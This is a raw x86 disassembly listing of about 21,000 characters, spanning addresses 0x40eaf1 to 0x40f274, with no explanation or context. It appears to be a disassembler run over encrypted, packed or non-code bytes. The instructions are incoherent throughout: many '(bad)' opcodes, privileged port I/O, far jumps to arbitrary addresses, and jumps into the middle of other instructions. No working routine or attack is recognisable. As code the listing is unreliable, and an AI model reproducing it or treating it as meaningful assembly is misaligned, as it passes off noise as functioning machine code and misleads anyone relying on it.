  40eaf1:	daa    
  40eaf2:	inc    eax
  40eaf3:	in     eax,dx
  40eaf4:	adc    BYTE PTR [edi+0x7d],bh
  40eaf7:	sets   BYTE PTR [edi]
  40eafa:	add    bl,BYTE PTR [edi-0x5e44b13b]
  40eb00:	jnp    0x40eb6b
  40eb02:	pop    ds
  40eb03:	sbb    cl,ah
  40eb05:	daa    
  40eb06:	ror    DWORD PTR [ecx-0x43],0x6c
  40eb0a:	or     BYTE PTR [edx+esi*8],ah
  40eb0d:	mov    ds:0xef97fb89,eax
  40eb12:	arpl   WORD PTR [ebp+0x152b1e9b],si
  40eb18:	add    eax,0xba3ba99e
  40eb1d:	inc    ecx
  40eb1e:	ret    
  40eb1f:	aam    0x67
  40eb21:	xchg   esi,eax
  40eb22:	cld    
  40eb23:	sub    esi,DWORD PTR [eax-0x56856bb8]
  40eb29:	pop    esi
  40eb2a:	aam    0xde
  40eb2c:	jmp    0x40eb61
  40eb2e:	jb     0x40eb89
  40eb30:	cwde   
  40eb31:	hlt    
  40eb32:	shl    DWORD PTR [ebp+0x1688724b],1
  40eb38:	and    DWORD PTR [ecx],edi
  40eb3a:	in     al,dx
  40eb3b:	add    dh,BYTE PTR [ebp-0x53]
  40eb3e:	dec    eax
  40eb3f:	ds and al,0xad
  40eb42:	nop
  40eb43:	test   ecx,edx
  40eb45:	and    DWORD PTR [eax+0x1a],0xffffffcb
  40eb49:	adc    BYTE PTR [edi+0x50],cl
  40eb4c:	int    0x99
  40eb4e:	dec    eax
  40eb4f:	push   ebx
  40eb50:	and    ch,bh
  40eb52:	mov    edi,0xb81042f3
  40eb57:	or     DWORD PTR ds:0xf0d2dd2f,edi
  40eb5d:	jnp    0x40ebcf
  40eb5f:	aas    
  40eb60:	xor    cl,BYTE PTR [ebp+0x664194ab]
  40eb66:	shl    edi,cl
  40eb68:	mov    fs,WORD PTR [esi+edi*4+0x4f5bc339]
  40eb6f:	ja     0x40ebe6
  40eb71:	sbb    bl,BYTE PTR [ebx+0x42]
  40eb74:	inc    eax
  40eb75:	pop    eax
  40eb76:	or     al,0x60
  40eb78:	dec    eax
  40eb79:	test   eax,0x51e8e8fa
  40eb7e:	xchg   edx,eax
  40eb7f:	pop    ebx
  40eb80:	inc    ebp
  40eb81:	daa    
  40eb82:	jp     0x40eb0d
  40eb84:	xor    al,0x25
  40eb86:	xchg   BYTE PTR [eax-0x1b3325e7],ah
  40eb8c:	out    0xe8,eax
  40eb8e:	outs   dx,BYTE PTR ds:[esi]
  40eb8f:	inc    ebx
  40eb90:	nop
  40eb91:	mov    ch,0x47
  40eb93:	leave  
  40eb94:	push   0xa43c0088
  40eb99:	outs   dx,BYTE PTR ds:[esi]
  40eb9a:	xchg   DWORD PTR [edi+0x1d0c2e2b],ebp
  40eba0:	push   edx
  40eba1:	push   ecx
  40eba2:	pushf  
  40eba3:	cmp    eax,0xe106e43f
  40eba8:	pop    ss
  40eba9:	or     BYTE PTR [ecx-0x3d],0xe9
  40ebad:	mov    ebx,0x237404ed
  40ebb2:	out    0x22,eax
  40ebb4:	imul   esp,DWORD PTR [edi+ebx*8+0x5b201d68],0x76
  40ebbc:	mov    ds:0xc45b1865,al
  40ebc1:	in     eax,dx
  40ebc2:	mov    ebx,0x4e70a84
  40ebc7:	mov    ds:0x83d02f73,al
  40ebcc:	mov    eax,ds:0x4a69a30
  40ebd1:	adc    DWORD PTR [edx+ebp*4+0x7e87619a],0x9af4cebe
  40ebdc:	(bad)  
  40ebdd:	icebp  
  40ebde:	pop    ebp
  40ebdf:	xchg   edx,eax
  40ebe0:	mov    dh,0xef
  40ebe2:	sub    DWORD PTR [ebx+0x7d187356],ecx
  40ebe8:	aam    0xa8
  40ebea:	in     eax,dx
  40ebeb:	fidiv  DWORD PTR ds:0x5004e8ee
  40ebf1:	scas   eax,DWORD PTR es:[edi]
  40ebf2:	or     al,0x9b
  40ebf4:	ret    
  40ebf5:	adc    bl,BYTE PTR [ecx]
  40ebf7:	inc    ebx
  40ebf8:	cmp    al,al
  40ebfa:	mov    eax,ds:0x306d3b6d
  40ebff:	ret    
  40ec00:	add    DWORD PTR [esi+0x48],ebp
  40ec03:	jmp    0x40ebdf
  40ec05:	adc    eax,DWORD PTR [eax+0x312dede3]
  40ec0b:	adc    al,0x45
  40ec0d:	mov    ebp,0x96de105a
  40ec12:	dec    esi
  40ec13:	xor    eax,0x9f2558fb
  40ec18:	cwde   
  40ec19:	sbb    eax,0x784c97e
  40ec1e:	stc    
  40ec1f:	cdq    
  40ec20:	retf   0x9623
  40ec23:	xlat   BYTE PTR ds:[ebx]
  40ec24:	jbe    0x40ec19
  40ec26:	push   edi
  40ec27:	icebp  
  40ec28:	test   al,0xa3
  40ec2a:	nop
  40ec2b:	sub    bh,BYTE PTR [ebx]
  40ec2d:	ja     0x40ec75
  40ec2f:	and    al,0xb8
  40ec31:	(bad)  
  40ec32:	sub    DWORD PTR [esi],edx
  40ec34:	(bad)  
  40ec35:	pop    eax
  40ec36:	pop    ecx
  40ec37:	retf   
  40ec38:	lods   al,BYTE PTR ss:[esi]
  40ec3a:	sbb    eax,0x6794c490
  40ec3f:	mov    esi,0xc08a88d2
  40ec44:	cmp    edx,DWORD PTR [ecx+0x2c]
  40ec47:	dec    DWORD PTR [eax-0x4d0a8c53]
  40ec4d:	into   
  40ec4e:	pop    edx
  40ec4f:	jnp    0x40eca8
  40ec51:	mov    ?,WORD PTR [eax+edx*2-0x46]
  40ec55:	and    al,0xb0
  40ec57:	xor    eax,0x98543c5
  40ec5c:	out    dx,eax
  40ec5d:	dec    eax
  40ec5e:	retf   0x8df1
  40ec61:	(bad)  [eax-0x77cd742f]
  40ec67:	fucomp st(5)
  40ec69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec6a:	div    esp
  40ec6c:	and    DWORD PTR [ecx-0x72533dac],ebp
  40ec72:	ret    0xa880
  40ec75:	aad    0x5f
  40ec77:	or     esi,DWORD PTR [esi+edx*8-0x3e05d823]
  40ec7e:	inc    ebp
  40ec7f:	fs mov cl,0x30
  40ec82:	lea    esp,[ebx-0x48ccfe09]
  40ec88:	jecxz  0x40ec0b
  40ec8a:	jle    0x40ecc2
  40ec8c:	or     DWORD PTR [esi-0x1fe04b31],ebx
  40ec92:	inc    eax
  40ec93:	push   esi
  40ec94:	popf   
  40ec95:	clc    
  40ec96:	sbb    eax,0xc7aa40f
  40ec9b:	cmp    al,0x4a
  40ec9d:	inc    edi
  40ec9e:	fld    QWORD PTR [edi+ecx*1]
  40eca1:	adc    bl,BYTE PTR ss:[eax+0x2]
  40eca5:	xchg   edi,eax
  40eca6:	aaa    
  40eca7:	mov    eax,ds:0x8766f354
  40ecac:	cli    
  40ecad:	daa    
  40ecae:	bound  esi,QWORD PTR [ebp-0x3a66da6]
  40ecb4:	mov    ah,0xf9
  40ecb6:	test   BYTE PTR [ebx+0x6de72da9],0x6c
  40ecbd:	mov    ebp,esp
  40ecbf:	lds    esi,FWORD PTR [ecx-0x58]
  40ecc2:	dec    edx
  40ecc3:	jo     0x40ec83
  40ecc5:	jmp    0x358:0xe1968172
  40eccc:	rol    DWORD PTR [ecx+0x15d6c1fa],1
  40ecd2:	retf   0x80cf
  40ecd5:	inc    edx
  40ecd6:	sbb    esp,DWORD PTR [ebx+0x44]
  40ecd9:	jb     0x40ecdf
  40ecdb:	add    DWORD PTR [ebx],esp
  40ecdd:	mov    esp,0xaf1480d1
  40ece2:	(bad)  
  40ece3:	repz sub ah,0x1d
  40ece7:	adc    ebx,DWORD PTR [edx-0x75]
  40ecea:	adc    al,0x5c
  40ecec:	aas    
  40eced:	nop
  40ecee:	aaa    
  40ecef:	pop    eax
  40ecf0:	jge    0x40ecf2
  40ecf2:	retf   
  40ecf3:	(bad)  
  40ecf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecf5:	cwde   
  40ecf6:	lea    edx,[edi+0x7b]
  40ecf9:	lods   al,BYTE PTR ds:[esi]
  40ecfa:	imul   edi
  40ecfc:	push   ds
  40ecfd:	pop    ecx
  40ecfe:	fwait
  40ecff:	sar    edi,0xa
  40ed02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed03:	add    ebx,DWORD PTR [eax+0x497b7f70]
  40ed09:	enter  0xf523,0xc
  40ed0d:	lea    ebp,[edi-0x24a7b923]
  40ed13:	lea    esp,[esi-0x2c1b272f]
  40ed19:	push   ebp
  40ed1a:	dec    esi
  40ed1b:	or     eax,DWORD PTR [esi+0x63]
  40ed1e:	ss push esp
  40ed20:	hlt    
  40ed21:	jnp    0x40ed3b
  40ed23:	(bad)  [ebp+0x1be05903]
  40ed29:	sbb    DWORD PTR [edi-0x1c478452],ebp
  40ed2f:	ds mov ecx,0xe96e7dc3
  40ed35:	call   0xba3e2f82
  40ed3a:	add    al,0xbb
  40ed3c:	loope  0x40eda3
  40ed3e:	adc    esp,DWORD PTR [esi-0x2c]
  40ed41:	stc    
  40ed42:	fimul  WORD PTR [eax]
  40ed44:	adc    BYTE PTR [eax],ch
  40ed46:	and    DWORD PTR [ebp-0x11],esi
  40ed49:	jmp    0x5392:0xeec09eb
  40ed50:	or     al,0x17
  40ed52:	not    BYTE PTR [esi]
  40ed54:	fisttp DWORD PTR [ecx]
  40ed56:	lock imul bh
  40ed59:	or     eax,0xf3640847
  40ed5e:	ins    BYTE PTR es:[edi],dx
  40ed5f:	dec    esp
  40ed60:	popa   
  40ed61:	dec    esi
  40ed62:	sub    al,0xcf
  40ed64:	iret   
  40ed65:	push   esp
  40ed66:	gs pop eax
  40ed68:	xor    al,0x3d
  40ed6a:	mov    BYTE PTR [eax+0x19],bl
  40ed6d:	int3   
  40ed6e:	xchg   esi,ecx
  40ed70:	clc    
  40ed71:	jl     0x40eda8
  40ed73:	out    0xc8,al
  40ed75:	mov    ds:0xeb54e9b5,eax
  40ed7a:	(bad)  
  40ed7b:	xchg   DWORD PTR [ecx+0x87ca791],eax
  40ed81:	sahf   
  40ed82:	iret   
  40ed83:	aaa    
  40ed84:	and    al,0x8e
  40ed86:	or     BYTE PTR [edi+0xa2993f3],al
  40ed8c:	stos   BYTE PTR es:[edi],al
  40ed8d:	gs fwait
  40ed8f:	lods   al,BYTE PTR ds:[esi]
  40ed90:	dec    esp
  40ed91:	ja     0x40ed9b
  40ed93:	jmp    0x40ede5
  40ed95:	loop   0x40edf1
  40ed97:	daa    
  40ed98:	mov    BYTE PTR [eax+eax*8+0x6d067c14],ch
  40ed9f:	ins    BYTE PTR es:[edi],dx
  40eda0:	or     ebp,DWORD PTR [edx-0x26]
  40eda3:	and    BYTE PTR ds:0x87514fc3,0x52
  40edaa:	push   edx
  40edab:	int    0x26
  40edad:	loope  0x40ee27
  40edaf:	das    
  40edb0:	cmp    DWORD PTR [ecx+0x59558564],esp
  40edb6:	imul   esp,DWORD PTR [ecx+ecx*4],0x2d
  40edba:	push   es
  40edbb:	xchg   DWORD PTR cs:[eax+0x2b],ebx
  40edbf:	push   edi
  40edc0:	add    eax,0x6aa992e3
  40edc5:	movaps xmm5,XMMWORD PTR [edi-0x3d]
  40edc9:	mov    ebp,ecx
  40edcb:	int3   
  40edcc:	pop    ebx
  40edcd:	gs mov esi,0x6f962223
  40edd3:	add    eax,0x36b90a20
  40edd8:	mul    DWORD PTR [eax-0x217e7463]
  40edde:	aaa    
  40eddf:	int3   
  40ede0:	int3   
  40ede1:	jmp    0x97cabd23
  40ede6:	repz shl DWORD PTR [ebp+0x469e192],0xa5
  40edee:	mov    bh,0x29
  40edf0:	push   cs
  40edf1:	retf   0xcba1
  40edf4:	add    BYTE PTR [edx],0xc8
  40edf7:	ins    DWORD PTR es:[edi],dx
  40edf8:	aaa    
  40edf9:	pop    ds
  40edfa:	(bad)  
  40edfb:	scas   al,BYTE PTR es:[edi]
  40edfc:	ffree  st(7)
  40edfe:	fs mov ch,0x5a
  40ee01:	rcr    dl,1
  40ee03:	push   esp
  40ee04:	icebp  
  40ee05:	movhps xmm4,QWORD PTR [ecx]
  40ee08:	inc    edx
  40ee09:	and    esi,DWORD PTR [eax]
  40ee0b:	add    ebx,DWORD PTR [eax]
  40ee0d:	push   0x3525dd74
  40ee12:	inc    eax
  40ee13:	add    ecx,DWORD PTR [ecx]
  40ee15:	lods   al,BYTE PTR ds:[esi]
  40ee16:	and    BYTE PTR [edi*4+0x5771b25f],ch
  40ee1d:	mov    ds:0xdbe8ce0b,eax
  40ee22:	mov    bl,0x3c
  40ee24:	and    dl,dh
  40ee26:	jmp    0x40eddb
  40ee28:	clc    
  40ee29:	into   
  40ee2a:	cdq    
  40ee2b:	adc    dl,ch
  40ee2d:	jl     0x40edd5
  40ee2f:	int    0xe1
  40ee31:	retf   0x8a2f
  40ee34:	call   0x22e7bfb
  40ee39:	es and eax,0xb2703540
  40ee3f:	ja     0x40edc4
  40ee41:	imul   eax,eax,0x49947b4a
  40ee47:	jl     0x40ee9f
  40ee49:	xchg   edx,eax
  40ee4a:	pop    ebp
  40ee4b:	sub    DWORD PTR [esp+ebx*8+0x552274f7],edx
  40ee52:	es sub eax,0x978c1034
  40ee58:	fdivp  st(1),st
  40ee5a:	jnp    0x40ee07
  40ee5c:	xor    al,0xdf
  40ee5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee5f:	add    DWORD PTR [edx],esi
  40ee61:	xchg   ebx,eax
  40ee62:	adc    BYTE PTR [ecx+0x267e4e29],al
  40ee68:	out    0x3a,eax
  40ee6a:	fnclex 
  40ee6c:	out    dx,al
  40ee6d:	jmp    0xc519:0xec94018e
  40ee74:	cmc    
  40ee75:	cmp    al,0xc6
  40ee77:	ror    edx,1
  40ee79:	cdq    
  40ee7a:	repz (bad) 
  40ee7c:	hlt    
  40ee7d:	push   ecx
  40ee7e:	or     WORD PTR ds:0x4d07acc8,dx
  40ee85:	and    al,BYTE PTR [ebx-0x5355bb66]
  40ee8b:	xchg   ecx,eax
  40ee8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee8d:	mov    cl,0x21
  40ee8f:	and    al,0xb
  40ee91:	and    ebx,ebx
  40ee93:	and    al,0xe1
  40ee95:	sbb    ebx,DWORD PTR [eax+0x28]
  40ee98:	or     eax,0x59623308
  40ee9d:	popa   
  40ee9e:	addr16 jbe 0x40eeb9
  40eea1:	pop    ebx
  40eea2:	pop    ebx
  40eea3:	leave  
  40eea4:	dec    eax
  40eea5:	xchg   ebx,eax
  40eea6:	add    esp,ebx
  40eea8:	sbb    eax,0xcbcd3c90
  40eead:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eeae:	ins    DWORD PTR es:[edi],dx
  40eeaf:	sbb    edx,DWORD PTR [ebp-0x3d]
  40eeb2:	enter  0x14cf,0xf
  40eeb6:	add    eax,0xb67e180b
  40eebb:	mov    DWORD PTR [ecx-0xc9fdb8e],edi
  40eec1:	jne    0x40ee7d
  40eec3:	xchg   esp,eax
  40eec4:	mov    edx,cs
  40eec6:	push   0x7f
  40eec8:	test   eax,0x3aa14517
  40eecd:	cmp    cl,ah
  40eecf:	idiv   eax
  40eed1:	mov    bh,0xce
  40eed3:	sbb    al,0x46
  40eed5:	jns    0x40ef33
  40eed7:	adc    bh,0x83
  40eeda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eedb:	xchg   ebx,eax
  40eedc:	jle    0x40ee92
  40eede:	pop    ebp
  40eedf:	push   ds
  40eee0:	mov    al,ds:0x21ab4fb4
  40eee5:	and    DWORD PTR [ebx],0xd9f26f06
  40eeeb:	stc    
  40eeec:	mov    dl,0x8c
  40eeee:	call   0x8f4d7156
  40eef3:	dec    esp
  40eef4:	mov    esp,0xadacef5c
  40eef9:	xchg   edi,eax
  40eefa:	ret    
  40eefb:	push   0xc47d17a4
  40ef00:	cdq    
  40ef01:	jmp    0xbabb10d8
  40ef06:	sbb    ah,cl
  40ef08:	call   0x1275:0x16e4ef9
  40ef0f:	push   es
  40ef10:	rol    dl,1
  40ef12:	xor    esi,DWORD PTR [ebp+ebx*4-0x6aafb9ef]
  40ef19:	push   ebp
  40ef1a:	sub    al,0xcd
  40ef1c:	pop    ss
  40ef1d:	push   eax
  40ef1e:	push   0x8ab757d
  40ef23:	fdiv   QWORD PTR [ecx-0x4cc378c3]
  40ef29:	push   cs
  40ef2a:	jne    0x40ef22
  40ef2c:	data16 xor BYTE PTR [ecx+0x5078342],0x64
  40ef34:	loop   0x40ef89
  40ef36:	mov    cl,0x95
  40ef38:	(bad)  
  40ef39:	and    edx,DWORD PTR [edx+0x4c]
  40ef3c:	pop    edi
  40ef3d:	jmp    0x40eeea
  40ef3f:	rcr    DWORD PTR [eax],0xb5
  40ef42:	mov    ecx,0x86dbddb0
  40ef47:	xchg   ecx,ebx
  40ef49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef4a:	sbb    ah,cl
  40ef4c:	sub    DWORD PTR [eax+0x49],0x47
  40ef50:	popa   
  40ef51:	das    
  40ef52:	aaa    
  40ef53:	jmp    0x40eef5
  40ef55:	shl    DWORD PTR [eax],1
  40ef57:	and    BYTE PTR [edx+0xe],0xba
  40ef5b:	xor    DWORD PTR [ebx+0x58],ecx
  40ef5e:	sar    DWORD PTR [edi-0x1b],1
  40ef61:	jne    0x40efdf
  40ef63:	(bad)  
  40ef64:	or     DWORD PTR ds:0x791612e9,ecx
  40ef6a:	(bad)  
  40ef6b:	out    0x7e,al
  40ef6d:	push   ecx
  40ef6e:	inc    ecx
  40ef6f:	xlat   BYTE PTR ds:[ebx]
  40ef70:	nop
  40ef71:	jnp    0x40efa5
  40ef73:	aas    
  40ef74:	mov    ebx,0xa01b02bc
  40ef79:	(bad)  
  40ef7a:	pushf  
  40ef7b:	inc    edx
  40ef7c:	out    dx,al
  40ef7d:	push   ss
  40ef7e:	jne    0x40efd8
  40ef80:	jecxz  0x40f001
  40ef82:	dec    esp
  40ef83:	lock mov edx,0x34d239e2
  40ef89:	xlat   BYTE PTR ds:[ebx]
  40ef8a:	gs push edi
  40ef8c:	xchg   esi,eax
  40ef8d:	lods   eax,DWORD PTR ds:[esi]
  40ef8e:	nop
  40ef8f:	pop    esi
  40ef90:	push   cs
  40ef91:	cs test dl,bh
  40ef94:	shl    bl,0x2a
  40ef97:	mov    ah,0xba
  40ef99:	call   0x8d17adc3
  40ef9e:	xchg   esp,eax
  40ef9f:	jle    0x40ef97
  40efa1:	xlat   BYTE PTR ds:[ebx]
  40efa2:	mov    ch,0xc7
  40efa4:	adc    BYTE PTR [edx+0x60d4e22f],cl
  40efaa:	sar    DWORD PTR [ebp+0x77e85bb0],cl
  40efb0:	xchg   esi,eax
  40efb1:	lods   al,BYTE PTR ds:[esi]
  40efb2:	dec    esi
  40efb3:	sub    eax,0x46d8e0c9
  40efb8:	sti    
  40efb9:	xor    DWORD PTR [ebx],esp
  40efbb:	cmp    edi,DWORD PTR [ecx-0x736c0f1c]
  40efc1:	add    al,0xac
  40efc3:	push   cs
  40efc4:	pop    ds
  40efc5:	mov    ?,WORD PTR [edi-0x7f]
  40efc8:	idiv   esp
  40efca:	and    DWORD PTR [esi],eax
  40efcc:	mov    ch,0xf0
  40efce:	mov    DWORD PTR [ecx-0x2b],edi
  40efd1:	fsubr  DWORD PTR [esi+0x536fe324]
  40efd7:	mov    bl,0x34
  40efd9:	mov    ch,0x1c
  40efdb:	push   ss
  40efdc:	xchg   edx,eax
  40efdd:	arpl   ax,ax
  40efdf:	pop    ebx
  40efe0:	repz push esi
  40efe2:	jg     0x40f04f
  40efe4:	and    eax,0x57a032ae
  40efe9:	ror    DWORD PTR cs:[esi+0x3fbe1b57],cl
  40eff0:	jg     0x40efcc
  40eff2:	dec    edx
  40eff3:	pop    ebp
  40eff4:	mov    eax,0xf899db14
  40eff9:	inc    edi
  40effa:	adc    eax,0xb8a1fba2
  40efff:	repnz sar BYTE PTR [esp+esi*1-0x3],0xbc
  40f005:	dec    ebx
  40f006:	and    ecx,edi
  40f008:	mov    cs,WORD PTR [ebp*2+0x618a7a83]
  40f00f:	stc    
  40f010:	adc    eax,0x2a758217
  40f015:	out    dx,al
  40f016:	not    BYTE PTR [ecx-0x1fad9c8]
  40f01c:	ret    0x87bb
  40f01f:	mov    esp,0x52050e8b
  40f024:	push   0x64b5e596
  40f029:	mov    bl,0xf0
  40f02b:	add    DWORD PTR [ebp-0x7d],esi
  40f02e:	outs   dx,DWORD PTR ds:[esi]
  40f02f:	xor    dl,al
  40f031:	adc    DWORD PTR [ecx+0xa],edx
  40f034:	pop    edi
  40f035:	in     al,dx
  40f036:	mov    bl,0xe7
  40f038:	pop    edx
  40f039:	int    0x6a
  40f03b:	lods   al,BYTE PTR ds:[esi]
  40f03c:	imul   ebx,DWORD PTR [ecx+eiz*1+0x18],0xb15803d6
  40f044:	ret    0xaeba
  40f047:	aam    0x86
  40f049:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f04a:	dec    edi
  40f04b:	jno    0x40f0a3
  40f04d:	mov    dl,0xf5
  40f04f:	sar    dl,cl
  40f051:	mov    ch,0x91
  40f053:	inc    ebp
  40f054:	enter  0x323a,0xc0
  40f058:	(bad)  
  40f059:	jmp    0x40f058
  40f05b:	push   ecx
  40f05c:	pop    ebp
  40f05d:	cmp    eax,0x4527a13f
  40f062:	cmp    eax,0x6fbea470
  40f067:	stos   DWORD PTR es:[edi],eax
  40f068:	push   cs
  40f069:	daa    
  40f06a:	jmp    0x40f052
  40f06c:	(bad)  
  40f06d:	clc    
  40f06e:	cmovae esi,DWORD PTR [eax]
  40f071:	adc    eax,0x182b19ef
  40f076:	push   es
  40f077:	xchg   ecx,eax
  40f078:	and    DWORD PTR [ebx-0x10],esp
  40f07b:	fbstp  TBYTE PTR [esi]
  40f07d:	mov    ecx,0xd0c410d2
  40f082:	les    ebp,FWORD PTR ds:0xb0f7fe94
  40f088:	in     eax,0xf
  40f08a:	iret   
  40f08b:	push   ebx
  40f08c:	mov    ecx,0xbb5e6f42
  40f091:	fistp  DWORD PTR [ebp+0xe]
  40f094:	shl    BYTE PTR [edi+0x29527d7e],1
  40f09a:	test   BYTE PTR [eax],dl
  40f09c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f09d:	call   0x6a48:0xf3f749e6
  40f0a4:	aas    
  40f0a5:	inc    edi
  40f0a6:	dec    ecx
  40f0a7:	mov    al,ds:0xa63c6c0b
  40f0ac:	loop   0x40f03a
  40f0ae:	cmp    BYTE PTR [esi+0x2c635e52],ah
  40f0b4:	cli    
  40f0b5:	and    ebx,edx
  40f0b7:	mov    bh,0xfc
  40f0b9:	adc    bl,BYTE PTR [esi-0x7525fc3f]
  40f0bf:	mul    DWORD PTR [esi-0x364a52af]
  40f0c5:	xchg   DWORD PTR [ebp-0x28],ebx
  40f0c8:	inc    edi
  40f0c9:	mov    ds,WORD PTR [ebp-0x2f]
  40f0cc:	mov    eax,ds:0xe160a9c8
  40f0d1:	pop    es
  40f0d2:	xor    esp,edi
  40f0d4:	cmp    al,al
  40f0d6:	add    al,0x33
  40f0d8:	popf   
  40f0d9:	gs mov dl,0x8c
  40f0dc:	push   es
  40f0dd:	add    BYTE PTR [esi-0x444ea4fe],al
  40f0e3:	pop    esi
  40f0e4:	arpl   dx,si
  40f0e6:	fcos   
  40f0e8:	inc    DWORD PTR [eax+0x5df80ac6]
  40f0ee:	repz adc eax,0x872bb18b
  40f0f4:	fcomp  QWORD PTR [esp-0x1d]
  40f0f8:	add    ebx,0x8743dd8f
  40f0fe:	jmp    0x40f141
  40f100:	push   ebx
  40f102:	sahf   
  40f103:	nop
  40f104:	mov    ch,0x18
  40f106:	mov    ds:0x9004de1f,al
  40f10b:	push   cs
  40f10c:	ror    edi,1
  40f10e:	out    0x2a,eax
  40f110:	test   DWORD PTR [edi+ebx*2-0x23cc3642],esi
  40f117:	repnz ins DWORD PTR es:[edi],dx
  40f119:	mov    esp,0x4ed4bf8d
  40f11e:	sbb    ah,BYTE PTR [ebx+0x72]
  40f121:	lock fidiv WORD PTR [edx+0x3414f9a6]
  40f128:	mov    ch,BYTE PTR [ecx]
  40f12a:	cld    
  40f12b:	xchg   edi,eax
  40f12c:	stos   DWORD PTR es:[edi],eax
  40f12d:	inc    ebp
  40f12e:	arpl   WORD PTR [ecx+0x758466f5],ax
  40f134:	mov    cl,0x36
  40f136:	and    esi,DWORD PTR [eax-0x2e]
  40f139:	fadd   QWORD PTR es:[ebx+esi*8+0x6a]
  40f13e:	(bad)  
  40f13f:	cmp    ah,BYTE PTR [edx]
  40f141:	lods   eax,DWORD PTR ds:[esi]
  40f142:	icebp  
  40f143:	out    dx,al
  40f144:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f145:	and    al,BYTE PTR [edx]
  40f147:	mov    ecx,DWORD PTR [esi]
  40f149:	jecxz  0x40f146
  40f14b:	cmp    DWORD PTR [ebx+esi*8+0x1e051558],ecx
  40f152:	and    eax,esp
  40f154:	push   eax
  40f155:	sbb    eax,0x18541a51
  40f15a:	cdq    
  40f15b:	iret   
  40f15c:	xor    ebx,DWORD PTR [eax+0x1c]
  40f15f:	and    BYTE PTR [ebx+0x49],dl
  40f162:	push   ss
  40f163:	out    dx,eax
  40f164:	xor    bl,BYTE PTR [ebx-0x3ed2ef8f]
  40f16a:	dec    ebp
  40f16b:	loop   0x40f10f
  40f16d:	call   0xba979e03
  40f172:	or     dh,BYTE PTR [edx]
  40f174:	mov    dl,0x44
  40f176:	enter  0x6d77,0x88
  40f17a:	pop    es
  40f17b:	jb     0x40f1d8
  40f17d:	data16 arpl WORD PTR [esi-0xf],dx
  40f181:	add    edi,0x5
  40f184:	push   eax
  40f185:	ret    
  40f186:	call   0x5a93015f
  40f18b:	push   edx
  40f18c:	cmp    eax,0x1fea5297
  40f191:	sub    esp,DWORD PTR [ebp+0x27]
  40f194:	cli    
  40f195:	mov    ds:0xc758032f,eax
  40f19a:	in     al,0x9d
  40f19c:	mov    ss,ebp
  40f19e:	int    0x7b
  40f1a0:	mov    dl,0x68
  40f1a2:	pushf  
  40f1a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1a4:	(bad)  
  40f1a5:	mov    WORD PTR [edx],fs
  40f1a7:	in     eax,0xe0
  40f1a9:	push   ds
  40f1aa:	mov    ebx,eax
  40f1ac:	js     0x40f16b
  40f1ae:	lods   eax,DWORD PTR ds:[esi]
  40f1af:	adc    cl,BYTE PTR [ebp-0x26cbc9a]
  40f1b5:	xchg   edi,eax
  40f1b6:	repz or eax,0x365fd890
  40f1bc:	(bad)  [esi]
  40f1be:	shl    BYTE PTR [ecx-0x54],1
  40f1c1:	dec    ebx
  40f1c2:	dec    esi
  40f1c3:	test   al,0xc7
  40f1c5:	push   edi
  40f1c6:	mov    bl,0x90
  40f1c8:	adc    al,0x4e
  40f1ca:	push   ss
  40f1cb:	dec    edi
  40f1cc:	cli    
  40f1cd:	addr16 jp 0x40f1b6
  40f1d0:	ins    BYTE PTR es:[edi],dx
  40f1d1:	sahf   
  40f1d2:	inc    edi
  40f1d3:	les    ecx,FWORD PTR [edx]
  40f1d5:	jnp    0x40f1f5
  40f1d7:	inc    eax
  40f1d8:	jbe    0x40f19f
  40f1da:	sub    BYTE PTR [ebp+0x4],al
  40f1dd:	inc    edx
  40f1de:	(bad)  
  40f1df:	mov    ah,BYTE PTR [eax-0x74b7cf08]
  40f1e5:	mov    ds:0x268b3de9,al
  40f1ea:	adc    al,0x5a
  40f1ec:	push   ebx
  40f1ed:	iret   
  40f1ee:	test   al,0xe6
  40f1f0:	ins    DWORD PTR es:[edi],dx
  40f1f1:	or     eax,0x424f354f
  40f1f6:	mov    ds:0xbca55858,eax
  40f1fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1fc:	icebp  
  40f1fd:	popa   
  40f1fe:	rcr    esp,cl
  40f200:	push   edx
  40f201:	or     al,0xd7
  40f203:	jge    0x40f241
  40f205:	and    al,0xbb
  40f207:	rcl    DWORD PTR [eax-0x6a],0x91
  40f20b:	adc    DWORD PTR [ebx+0x689b2759],ebp
  40f211:	fcmove st,st(7)
  40f213:	push   cs
  40f214:	cld    
  40f215:	inc    ecx
  40f216:	inc    ebp
  40f217:	adc    BYTE PTR [ebx+0x7f48075c],cl
  40f21d:	mov    bl,0x44
  40f21f:	mov    ds:0xea565a32,al
  40f224:	push   ebp
  40f225:	dec    edx
  40f226:	inc    edx
  40f227:	fcomp  DWORD PTR [ebp+0x1f45c1d0]
  40f22d:	xor    DWORD PTR [ebp+0x4679ca7c],ebp
  40f233:	push   ebx
  40f234:	lahf   
  40f235:	cli    
  40f236:	or     eax,0xfeaad3dc
  40f23b:	in     eax,0xd6
  40f23d:	xor    eax,0xa727bf88
  40f242:	adc    edx,eax
  40f244:	cld    
  40f245:	jns    0x40f203
  40f247:	arpl   WORD PTR [edx],bp
  40f249:	push   ss
  40f24a:	cmp    al,0xef
  40f24c:	(bad)  
  40f24d:	hlt    
  40f24e:	fs ja  0x40f230
  40f251:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f252:	loop   0x40f242
  40f254:	(bad)  
  40f255:	xchg   ecx,eax
  40f256:	cwde   
  40f257:	(bad)
  40f25b:	sar    cl,0xaa
  40f25e:	daa    
  40f25f:	aam    0xaf
  40f261:	repz arpl WORD PTR [ebp-0xa],di
  40f265:	and    bh,ch
  40f267:	or     ebx,DWORD PTR [ecx+0x71e71ddb]
  40f26d:	dec    ebp
  40f26e:	call   DWORD PTR [edx+0x74]
  40f271:	inc    edi
  40f272:	jnp    0x40f2c0
  40f274:	jle    0x40f265
